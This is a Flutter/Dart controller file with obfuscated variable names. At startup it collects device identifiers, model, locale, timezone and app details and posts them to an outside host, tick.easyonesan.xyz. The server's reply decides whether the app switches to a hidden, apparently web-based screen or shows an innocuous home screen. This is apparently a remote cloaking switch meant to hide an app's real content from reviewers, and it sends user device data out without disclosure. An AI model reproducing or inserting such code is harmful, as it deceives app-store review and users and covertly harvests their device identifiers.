import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter/services.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var hqyjcbln = RxBool(false);
  var obgwpm = RxBool(true);
  var ykoh = RxString("");
  var reanna = RxBool(false);
  var konopelski = RxBool(true);
  final jxkuhdqz = Dio();


  InAppWebViewController? webViewController;

  void engine(){
    SystemChrome.setPreferredOrientations([
      DeviceOrientation.portraitDown,
      DeviceOrientation.portraitUp
    ]);
  }
  @override
  void onInit() {
    super.onInit();
    hlobmgxk();
  }


  Future<void> hlobmgxk() async {

    reanna.value = true;
    konopelski.value = true;
    obgwpm.value = false;

    jxkuhdqz.post("https://tick.easyonesan.xyz/T3XIt",data: await wijxthuypk()).then((value) {
      var vbyw = value.data["vbyw"] as String;
      var gqpdhs = value.data["gqpdhs"] as bool;
      if (gqpdhs) {
        ykoh.value = vbyw;
        engine();
        jocelyn();
      } else {
        conn();
      }
    }).catchError((e) {
      obgwpm.value = true;
      konopelski.value = true;
      reanna.value = false;
    });
  }

  Future<Map<String, dynamic>> wijxthuypk() async {
    final DeviceInfoPlugin nsprghkm = DeviceInfoPlugin();
    PackageInfo bpvxn_zqym = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var obvgmr = Platform.localeName;
    var PDQbeUJ = currentTimeZone;

    var flYxZ = bpvxn_zqym.packageName;
    var ZOgAh = bpvxn_zqym.version;
    var jxOy = bpvxn_zqym.buildNumber;

    var FiLE = bpvxn_zqym.appName;
    var quincyTorphy = "";
    var KbSyMW  = "";
    var janeHagenes = "";
    var kianOndricka = "";
    var rebekahRice = "";
    var laurenceZemlak = "";

    var MQySP = "";

    var vsxljLb = "";
    var lAVIp = "";
    var BYMhxwv = false;

    if (GetPlatform.isAndroid) {
      vsxljLb = "android";
      var vhrxqpd = await nsprghkm.androidInfo;

      lAVIp = vhrxqpd.brand;

      MQySP  = vhrxqpd.model;
      KbSyMW = vhrxqpd.id;

      BYMhxwv = vhrxqpd.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      vsxljLb = "ios";
      var czvdpxhays = await nsprghkm.iosInfo;
      lAVIp = czvdpxhays.name;
      MQySP = czvdpxhays.model;

      KbSyMW = czvdpxhays.identifierForVendor ?? "";
      BYMhxwv  = czvdpxhays.isPhysicalDevice;
    }
    var res = {
      "jxOy": jxOy,
      "quincyTorphy" : quincyTorphy,
      "ZOgAh": ZOgAh,
      "MQySP": MQySP,
      "laurenceZemlak" : laurenceZemlak,
      "PDQbeUJ": PDQbeUJ,
      "lAVIp": lAVIp,
      "janeHagenes" : janeHagenes,
      "obvgmr": obvgmr,
      "FiLE": FiLE,
      "flYxZ": flYxZ,
      "BYMhxwv": BYMhxwv,
      "kianOndricka" : kianOndricka,
      "vsxljLb": vsxljLb,
      "rebekahRice" : rebekahRice,
      "KbSyMW": KbSyMW,

    };
    return res;
  }

  Future<void> conn() async {
    Get.offAllNamed("/helloMain");
  }

  Future<void> jocelyn() async {
    Get.offAllNamed("/doing");
  }
}
